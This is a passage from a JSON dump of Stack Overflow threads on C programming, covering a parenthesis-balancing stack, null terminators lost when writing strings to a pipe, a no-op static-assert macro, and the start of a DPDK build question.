default:\n                break;\n        }\n    }\n    return (!p) | ((!s) &lt;&lt; 1) | ((!b) &lt;&lt; 2);\n}\n</code></pre>\n\n<p>Not the stack version but just for the idea. It is rather easy to add push and pop</p>\n"}, {"comments": [{"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1545889712, "post_id": 53924362, "comment_id": 94719945, "body": "@lamyabhasin could you post the code you used? A debugging session will surely discover the error."}, {"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1545909585, "post_id": 53924362, "comment_id": 94727033, "body": "ive posted scroll up"}, {"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1545909625, "post_id": 53924362, "comment_id": 94727058, "body": "what type of debugger do you use ? i dont use any as of now. i have a macbook air"}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1545909836, "post_id": 53924362, "comment_id": 94727164, "body": "@lamyabhasin I don&#39;t see new code, and I don&#39;t see the popmatch() func. About debugger, I think to use gdb on a linux system, but it is not really important."}], "tags": [], "owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1545759200, "creation_date": 1545759200, "answer_id": 53924362, "question_id": 53923750, "link": "https://stackoverflow.com/questions/53923750/semantical-error-with-parenthesis-balancing-here/53924362#53924362", "title": "semantical error with parenthesis balancing here", "body": "<p>I assume that the idea is this: an opening paren is always permitted (in the analyzed text), but a closing paren must match the last opened. This is why a stack is required. Also, in the end, if the stack is not empty that means that some parens were not closed.</p>\n\n<p>So, you should use the stack, but only when you encounter parens - either opening or closing.</p>\n\n<p>In the function isBalanced(), the main cycle could be this:</p>\n\n<pre><code>while (s[i] != '\\0') {\n    if ( s[i] == '(' || s[i] == '{' || s[i] == '[' ) {\n        // opening - remember it\n        push(sptr, s[i]);\n    } else if ( s[i] == ')' || s[i] == '}' || s[i] == ']' ) {\n        // closing - it should match\n        if ( ! popmatch(sptr, s[i]) )\n          return n;\n    }\n    ++i;\n}\n</code></pre>\n\n<p>The rest of the function is ok. Now, I modified the the pop() function: renamed to popmatch, because it should check if the argument matches the top of the stack. If it does, pop the stack and return OK. So the function would be:</p>\n\n<pre><code>char popmatch(STACK* sptr, char c) {\n    // an empty stack can not match\n    if (isEmpty(sptr))\n      return 0;\n\n    // not empty, can check for equality\n    if ( c =! sptr-&gt;s[sptr-&gt;top] )\n      return 0;\n      // does not match!\n\n    // ok, it matches so pop it and return ok\n    sptr-&gt;top--;\n    return 1;\n}\n</code></pre>\n\n<p>Please note that the code mirrors pretty well the \"analysis\"; when the analysis is short and clear, and the code follows the analysis, the result often is short and clear too.</p>\n"}, {"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545886274, "post_id": 53939693, "comment_id": 94719219, "body": "<code>if (fgets (c, sizeof c, stdin) == NULL) break;</code> as a bonus. A sequence without whitespace just seems less readable."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545914567, "post_id": 53939693, "comment_id": 94729094, "body": "@DavidC.Rankin: you are correct about white space, but using <code>fgets()</code> here and <code>scanf()</code> for the next question would cause unexpected behavior for the second iteration of this loop. I updated the answer with a different fix."}, {"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1546162647, "post_id": 53939693, "comment_id": 94790686, "body": "@chqrlie OH !  i finally understood my errors. thanks alot !"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 1, "last_activity_date": 1545914355, "last_edit_date": 1545914355, "creation_date": 1545884409, "answer_id": 53939693, "question_id": 53923750, "link": "https://stackoverflow.com/questions/53923750/semantical-error-with-parenthesis-balancing-here/53939693#53939693", "title": "semantical error with parenthesis balancing here", "body": "<p>Here are some major issues in your code:</p>\n\n<ul>\n<li><p>you do not properly initialize the stack with <code>create(sptr)</code> before use, preferably in <code>main()</code> where it is defined. Your code has undefined behavior. It prints <code>NO</code> by chance, probably because <code>sptr-&gt;top</code> has an initial value of <code>0</code>, which makes the stack non-empty. </p></li>\n<li><p>you should only pop from the stack when you encounter a closing delimiter <code>)</code>, <code>]</code> or <code>}</code>.</p></li>\n<li><p>you should prevent potential buffer overflow by telling <code>scanf()</code> the maximum number of characters to read into <code>c</code>: <code>scanf(\"%20s\", c)</code>. Furthermore you should test the return value to avoid undefined behavior at end of file.</p></li>\n<li><p>Note also that the STACK can be made a local variable to avoid heap allocation and potential allocation failure, which would cause undefined behavior since it is not tested.</p></li>\n</ul>\n\n<p>Here is a corrected version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef struct stack {\n    char s[1000];\n    int top;\n} STACK;\n\nvoid create(STACK *sptr) {\n    sptr-&gt;top = -1;\n}\n\nint isEmpty(STACK *sptr) {\n    if (sptr-&gt;top == -1)\n        return 1;\n    else \n        return 0;\n}\n\nvoid push(STACK *sptr, char data) {\n    sptr-&gt;s[++sptr-&gt;top] = data;\n}\n\nchar pop(STACK *sptr) {\n    if (isEmpty(sptr) == 0)\n        return sptr-&gt;s[sptr-&gt;top--];\n    else\n        return '$';\n}\n\nint isBalanced(char *s, STACK *sptr) {\n    int i;\n\n    for (i = 0; s[i] != '\\0'; i++) {\n        switch (s[i]) {\n          case '(':\n          case '{':\n          case '[':\n            push(sptr, s[i]);\n            break;\n          case ')':\n            if (pop(sptr) != '(')\n                return 0; \n            break;\n          case '}':\n            if (pop(sptr) != '{') \n                return 0;\n            break;\n          case ']':\n            if (pop(sptr) != '[') \n                return 0;\n            break;\n        }\n    }\n    return isEmpty(sptr);\n}\n\nint main() {\n    STACK s, *sptr = &amp;s;\n    char c[100];\n    int ch;\n\n    do {\n        printf(\"Enter sequence: \");\n        if (scanf(\" %99[^\\n]\", c) != 1)\n            break;\n        create(sptr);\n        printf(\"%s\\n\", isBalanced(c, sptr) ? \"YES\" : \"NO\");\n        printf(\"Choice? \");\n        if (scanf(\"%d\", &amp;ch) != 1)\n            break;\n    } while (ch);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 53939693, "answer_count": 4, "score": 2, "last_activity_date": 1545914355, "creation_date": 1545752894, "last_edit_date": 1545914328, "question_id": 53923750, "link": "https://stackoverflow.com/questions/53923750/semantical-error-with-parenthesis-balancing-here", "title": "semantical error with parenthesis balancing here", "body": "<p>I've written a C code to check for simple parenthesis balancing which prints <code>NO</code> and <code>YES</code> if balanced, not balanced respectively.</p>\n\n<p>The problem is that I'm getting <code>NO</code> for all inputs. Hence I'm thinking that its a semantic error but cannot find it (I have been trying for 2 days :p) </p>\n\n<p>Could someone please help me here? thanks!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct stack {\n    char s[1000];\n    int top;\n} STACK;\n\nvoid create(STACK *sptr) {\n    sptr-&gt;top = -1;\n}\n\nint isEmpty(STACK *sptr) {\n    if (sptr-&gt;top == -1)\n        return 1;\n    else\n        return 0;\n}\n\nvoid push(STACK *sptr, char data) {\n    sptr-&gt;s[++sptr-&gt;top] = data;\n}\n\nchar pop(STACK *sptr) {\n    if (isEmpty(sptr) == 0)\n        return sptr-&gt;s[sptr -&gt; top];\n    else\n        return '$';\n}\n\nchar *isBalanced(char *s, STACK *sptr) {\n    char *y, *n;\n    int i = 0;\n    y = (char*)malloc(sizeof(char) * 4);\n    y[0] = 'Y';\n    y[1] = 'E';\n    y[2] = 'S';\n    y[3] = '\\0';\n    n = (char*)malloc(sizeof(char) * 3);\n    n[0] = 'N';\n    n[1] = 'O';\n    n[2] = '\\0';\n\n    while (s[i] != '\\0') {\n        if (s[i] == '(' || s[i] == '{' || s[i] == '[') {\n            push(sptr, s[i]);\n        } else {\n            char x = pop(sptr);\n            switch (s[i]) {\n              case ')':\n                if (x != '(') \n                    return n;\n                break;\n\n              case '}':\n                if (x != '{') \n                    return n;\n                break;\n\n              case ']':\n                if (x != '[') \n                    return n;\n                break;\n            }\n        }\n        ++i;\n    }\n\n    if (isEmpty(sptr))\n        return y;\n    else\n        return n;\n}\n\nint main() {\n    STACK *sptr = (STACK *)malloc(sizeof(STACK));\n    char c[21];\n    int ch;\n    do {\n        printf(\"enter sequence:\");\n        scanf(\"%s\", c);\n        char *msg = isBalanced(c, sptr);\n        printf(\"%s\", msg);\n        printf(\"choice?:\");\n        scanf(\"%d\", &amp;ch);\n    } while(ch);\n}\n</code></pre>\n\n<blockquote>\n  <p>updated code:</p>\n</blockquote>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct stack {\n    char s[1000];\n    int top;\n} STACK;\n\nvoid create(STACK *sptr) {\n    sptr-&gt;top = -1;\n}\n\nint isEmpty(STACK *sptr) {\n    if (sptr-&gt;top == -1)\n        return 1;\n    else \n        return 0;\n}\n\nvoid push(STACK *sptr, char data) {\n    sptr-&gt;s[++sptr-&gt;top] = data;\n}\n\nchar pop(STACK *sptr) {\n    if (isEmpty(sptr) == 0)\n        return sptr-&gt;s[sptr-&gt;top--];\n    else\n        return '$';\n}\n\nint isBalanced(char *s, STACK *sptr) {\n    int i = 0;\n\n    while (s[i] != '\\0') {\n        if (s[i] == '(' || s[i] == '{' || s[i] == '[') {\n            push(sptr, s[i]);\n        } else {\n            char x = pop(sptr);\n            switch (s[i]) {\n              case ')':\n                if (x != '(')\n                    return 0; \n                break;\n              case '}':\n                if (x != '{') \n                    return 0;\n                break;\n              case ']':\n                if (x != '[') \n                    return 0;\n                break;\n            }\n        }\n        ++i;\n    }\n\n    if (isEmpty(sptr))\n        return 1;\n    else \n        return 0;\n}\n\nint main() {\n    STACK *sptr = malloc(sizeof(STACK));\n    char c[21];\n    int ch;\n    do {\n        printf(\"enter sequence:\");\n        scanf(\"%s\", c);\n        printf(\"%s\", (isBalanced(c, sptr) ? \"YES\" : \"NO\"));\n        printf(\"choice?:\");\n        scanf(\"%d\", &amp;ch);\n\n    } while(ch);\n}\n</code></pre>\n"}, {"tags": ["c", "pipe"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 10662685, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-HkY-WVmE_BA/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-jiAAhPgq0i1VdD2-3LXcqLD4UaWw/mo/photo.jpg?sz=128", "display_name": "Roger Piera", "link": "https://stackoverflow.com/users/10662685/roger-piera"}, "edited": false, "score": 0, "creation_date": 1545753250, "post_id": 53923746, "comment_id": 94689201, "body": "I don&#39;t know how I missed that... Thanks."}], "tags": [], "owner": {"reputation": 12106, "user_id": 4431643, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CoZjt.jpg?s=128&g=1", "display_name": "kiran Biradar", "link": "https://stackoverflow.com/users/4431643/kiran-biradar"}, "is_accepted": true, "score": 5, "last_activity_date": 1545752857, "creation_date": 1545752857, "answer_id": 53923746, "question_id": 53923723, "link": "https://stackoverflow.com/questions/53923723/inconsistent-reading-of-string-from-pipe/53923746#53923746", "title": "Inconsistent reading of string from pipe", "body": "<p>It is because your string is not null(<code>\\0</code>) terminated.</p>\n\n<p>As you write to the pipe excluding null(<code>\\0</code>) terminator.</p>\n\n<pre><code>write(file_name_HTML[WRITE], lines[i], strlen(lines[i])+1);\n                                                        ^--- +1 to include null character.\n</code></pre>\n\n<blockquote>\n  <p><code>strlen</code> returns the length excluding null terminator.</p>\n</blockquote>\n"}], "owner": {"reputation": 35, "user_id": 10662685, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-HkY-WVmE_BA/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-jiAAhPgq0i1VdD2-3LXcqLD4UaWw/mo/photo.jpg?sz=128", "display_name": "Roger Piera", "link": "https://stackoverflow.com/users/10662685/roger-piera"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 53923746, "answer_count": 1, "score": 1, "last_activity_date": 1545752857, "creation_date": 1545752553, "question_id": 53923723, "link": "https://stackoverflow.com/questions/53923723/inconsistent-reading-of-string-from-pipe", "title": "Inconsistent reading of string from pipe", "body": "<p>I read some data from a file, and send it through a pipe. When I read the data from the pipe, sometimes there's extra characters inside. The extra characters are also inconsistent, but normally is an extra \"R\" at the end. </p>\n\n<p>The data I read from the file is correct, as it is always as it should be. It's only after reading it from the pipe that I encounter problems.</p>\n\n<p>Could you help me find the error? I've been staring at this for ages and I can't find it.</p>\n\n<p>This is the part of my code that is giving me trouble.</p>\n\n<p>Thanks for your help.</p>\n\n<pre><code>int main (int argc, char **argv) {\n\n    int nClients;\n    int file_name_HTML[2];\n\n    create_pipes(file_name_HTML, server_access_request);\n    init_free_pipes();\n\n    nClients = getHTMLFilesIntoPipe(file_name_HTML);\n    int clients[nClients];\n\n    for(int i=0; i &lt; nClients; i++)\n    { \n        if((clients[i] = fork()) == 0) \n        { \n            clientFunction(file_name_HTML, server_access_request);\n        } \n    }\n    .....\n}\n\nint getHTMLFilesIntoPipe(int *file_name_HTML)\n{\n    int i, n = 0;\n    char (*lines)[MAXCHAR] = NULL;\n    FILE *fp;\n    fp = fopen(\"./data/listado_html.txt\", \"r\");\n\n    if (!fp) {  /* valdiate file open for reading */\n    err_exit(\"error: file open failed.\\n\");\n    }\n\n    if (!(lines = malloc (MAXLINES * sizeof *lines))) {\n    err_exit(\"error: virtual memory exhausted 'lines'.\\n\");\n    }\n\n    while (n &lt; MAXLINES &amp;&amp; fgets (lines[n], MAXCHAR, fp)) /* read each line */\n    { \n        char *p = lines[n];                 /* assign pointer  */\n        for (; *p &amp;&amp; *p != '\\n'; p++) {}    /* find 1st '\\n'   */\n        if (*p != '\\n') /* check line read */\n        {                   \n            int c;  \n            while ((c = fgetc (fp)) != '\\n' &amp;&amp; c != EOF) {} /* discard remainder of line with getchar  */\n        }\n        *p = 0, n++;    /* nul-termiante   */\n    }\n    if (fp != stdin) fclose (fp);   /* close file if not stdin */\n\n    for (int i = 0; i &lt; n; i++)\n    {\n        write(file_name_HTML[WRITE], lines[i], strlen(lines[i]));\n    }\n\n    free(lines);\n\n    return n;\n}\n\nvoid clientFunction(int *file_name_HTML, int *server_access_request)\n{\n    char fileName[MAXCHAR];\n\n    close(file_name_HTML[WRITE]);\n    //Read HTML file name\n    read(file_name_HTML[READ], fileName, MAXCHAR - 1);\n    printf(\"%s\\n\", fileName);\n\n    .......\n}\n</code></pre>\n\n<p>Expected output:\nabcd1.html</p>\n\n<p>abcd2.html</p>\n\n<p>abcd3.html</p>\n\n<p>abcd4.html</p>\n\n<p>abcd5.html</p>\n\n<p>Current output:\nabcd1.htmlR</p>\n\n<p>abcd2.htmlR</p>\n\n<p>abcd3.htmlR</p>\n\n<p>abcd4.htmlR</p>\n\n<p>abcd5.htmlR</p>\n"}, {"tags": ["c", "c89", "static-assert"], "comments": [{"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 3, "creation_date": 1545755361, "post_id": 53923706, "comment_id": 94689622, "body": "<code>#define STATIC_ASSERT(cond) void never_called()</code> -- the semicolon completes the forward declaration."}, {"owner": {"reputation": 31218, "user_id": 211160, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z2fk7.png?s=128&g=1", "display_name": "HostileFork says dont trust SE", "link": "https://stackoverflow.com/users/211160/hostilefork-says-dont-trust-se"}, "reply_to_user": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 0, "creation_date": 1545756124, "post_id": 53923706, "comment_id": 94689774, "body": "@RaymondChen It seems in some compiler/warning combinations you get warnings about having forward function declarations more than once.  You can disable those, but assuming they are there for a good reason...the struct solution below doesn&#39;t appear to trigger any warnings."}], "answers": [{"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 3, "creation_date": 1545753638, "post_id": 53923785, "comment_id": 94689281, "body": "There is no need for <code>__LINE__</code> or concatenation. Type definitions may be repeated, so any name that will not be otherwise used is fine; one can use <code>typedef void VoidTypeKludge</code>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 4, "creation_date": 1545753843, "post_id": 53923785, "comment_id": 94689324, "body": "You could also just use <code>struct StaticAssertSurrogate</code> as the replacement text, which will work with compilers older than C11 (which is when it became possible to repeat a typedef).  It doesn&#39;t even matter whether the structure tag exists as a real structure type."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545753995, "post_id": 53923785, "comment_id": 94689353, "body": "@JonathanLeffler - Thanks, I was just in the process of checking typedef redefinition rules in C89."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1545754395, "post_id": 53923785, "comment_id": 94689431, "body": "C11 <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7p3\" rel=\"nofollow noreferrer\">&#167;6.7 Declarations &#182;3</a>.  The wording about <i>a typedef name may be redefined to denote the same type as it currently does</i>  is new."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 31218, "user_id": 211160, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z2fk7.png?s=128&g=1", "display_name": "HostileFork says dont trust SE", "link": "https://stackoverflow.com/users/211160/hostilefork-says-dont-trust-se"}, "edited": false, "score": 0, "creation_date": 1545755142, "post_id": 53923785, "comment_id": 94689573, "body": "@HostileFork - I stepped out shortly after editing the alternative in. I marked it as CW though (only thing that&#39;s relatively easy on mobile). If you don&#39;t mind, make the edit. Or I&#39;ll get back to it later."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 31218, "user_id": 211160, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z2fk7.png?s=128&g=1", "display_name": "HostileFork says dont trust SE", "link": "https://stackoverflow.com/users/211160/hostilefork-says-dont-trust-se"}, "edited": false, "score": 0, "creation_date": 1545755339, "post_id": 53923785, "comment_id": 94689615, "body": "@HostileFork \u2014 if you have a C90 compiler, it would object if you had a static assert after a statement in a compound statement. This is not your primary concern (it\u2019ll always be OK at file scope if the static assert is OK too), but it isn\u2019t limited to being used at file scope.  The risk is low, though."}], "tags": [], "owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "is_accepted": true, "score": 14, "last_activity_date": 1545755991, "last_edit_date": 1545755991, "creation_date": 1545753239, "answer_id": 53923785, "question_id": 53923706, "link": "https://stackoverflow.com/questions/53923706/workaround-for-semicolon-in-global-scope-warning-for-no-op-c-macro/53923785#53923785", "title": "Workaround for &quot;semicolon in global scope&quot; warning for no-op C macro", "body": "<p>Since forward declarations of structures may be repeated as much as we want, you can use a dummy declaration:</p>\n\n<pre><code>#define STATIC_ASSERT(cond) struct GlobalScopeNoopTrick\n</code></pre>\n\n<p>@JonathanLeffler says this should work in older compilers, even pre-C11...but:</p>\n\n<blockquote>\n  <p>\"If you have a C90 compiler, it would object if you had a static assert after a statement in a <a href=\"https://en.cppreference.com/w/cpp/language/statements#Compound_statements\" rel=\"noreferrer\">compound statement</a>. This is not your primary concern (it\u2019ll always be OK at file scope if the static assert is OK too), but it isn\u2019t limited to being used at file scope. The risk is low, though\"</p>\n</blockquote>\n\n<p>For related situations that might not be <em>entirely</em> no-ops at compile-time, C11 introduced the ability to repeat typedefs.  And as in the post linked about static asserts in C prior to <a href=\"https://en.cppreference.com/w/c/language/_Static_assert\" rel=\"noreferrer\">_Static_assert()</a> shows, there are ways to get around typedef duplication for older C using the line number or another disambiguator:</p>\n\n<pre><code>/* Standard indirection to allow concatenation after expansion */\n#define CONCAT(a,b) CONCAT_(a,b)\n#define CONCAT_(a,b) a##b\n\n#if defined(__cplusplus) &amp;&amp; __cplusplus &gt;= 201103L\n    #define STATIC_ASSERT(cond) \\\n        static_assert((cond), #cond)\n#else\n    #define STATIC_ASSERT(cond) typedef void CONCAT(dummy_unused_,__LINE__)\n#endif\n</code></pre>\n\n<p>So long as static assertions appear one per line the identifiers won't conflict with each other.</p>\n"}], "owner": {"reputation": 31218, "user_id": 211160, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z2fk7.png?s=128&g=1", "display_name": "HostileFork says dont trust SE", "link": "https://stackoverflow.com/users/211160/hostilefork-says-dont-trust-se"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 731, "favorite_count": 3, "accepted_answer_id": 53923785, "answer_count": 1, "score": 12, "last_activity_date": 1545756314, "creation_date": 1545752432, "last_edit_date": 1545756314, "question_id": 53923706, "link": "https://stackoverflow.com/questions/53923706/workaround-for-semicolon-in-global-scope-warning-for-no-op-c-macro", "title": "Workaround for &quot;semicolon in global scope&quot; warning for no-op C macro", "body": "<p>In a codebase that can be built as either C or C++, I thought I'd make a macro to take advantage of <code>static_assert</code> in the case it's built as C++11 or higher.</p>\n\n<p><em>(Note: I know <a href=\"https://stackoverflow.com/a/3385694/211160\">there are ways to do this in pre-C11 C</a>, at least if you're willing to take a message parameter--though it won't work quite everywhere.  But for the sake of argument let's say I have some legitimate need to make it take no message, and be a no-op in at least some C builds.)</em></p>\n\n<p>So here was the simple definition I tried:</p>\n\n<pre><code>#if defined(__cplusplus) &amp;&amp; __cplusplus &gt;= 201103L\n    #define STATIC_ASSERT(cond) \\\n        static_assert((cond), #cond)\n#else\n    #define STATIC_ASSERT(cond)\n#endif\n</code></pre>\n\n<p>There's no semicolon in the macro, with the intent that you would add it at the callsite.  But under pedantic C warning settings, this macro appearing in global scope causes:</p>\n\n<blockquote>\n  <p>error: ISO C does not allow extra \u2018;\u2019 outside of a function [-Werror=pedantic]</p>\n</blockquote>\n\n<p>The easy solution seems to be to take the semicolon off the callsites, and put it in the C++11 side of the macro.  But I wonder: <strong>how do you make a no-op macro in global scope which allows a semicolon at the callsite</strong> (without running afoul of some other warning)?</p>\n"}, {"tags": ["c", "linux", "dpdk"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1545747099, "post_id": 53923097, "comment_id": 94687902, "body": "Please try to create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> to show us."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1545747157, "post_id": 53923097, "comment_id": 94687917, "body": "You have a nameless-union?  What&#39;s inside the <code>...</code> ? Are there some <code>;</code> missing?"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545747948, "post_id": 53923097, "comment_id": 94688089, "body": "Please add the previous version against which the compilation was working"}, {"owner": {"reputation": 13, "user_id": 3509719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cfd23efa6f158d6d80a63f8c6251a1?s=128&d=identicon&r=PG&f=1", "display_name": "user3509719", "link": "https://stackoverflow.com/users/3509719/user3509719"}, "edited": false, "score": 0, "creation_date": 1546341815, "post_id": 53923097, "comment_id": 94827387, "body": "Previous DPDK version was 1.7.1"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 3509719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cfd23efa6f158d6d80a63f8c6251a1?s=128&d=identicon&r=PG&f=1", "display_name": "user3509719", "link": "https://stackoverflow.com/users/3509719/user3509719"}, "edited": false, "score": 0, "creation_date": 1546336362, "post_id": 53925071, "comment_id": 94826429, "body": "Thanks. So can I replace the above piece of code with:                                                                                                                                                                                                           rte_pktmbuf_mtod(m, void *) = (rte_pktmbuf_mtod(m, void *) -  (BTG_IP_VH                                                                                       L_HL(ip-&gt;version_ihl) &lt;&lt; 2));                                                                                                               I hope this should work."}, 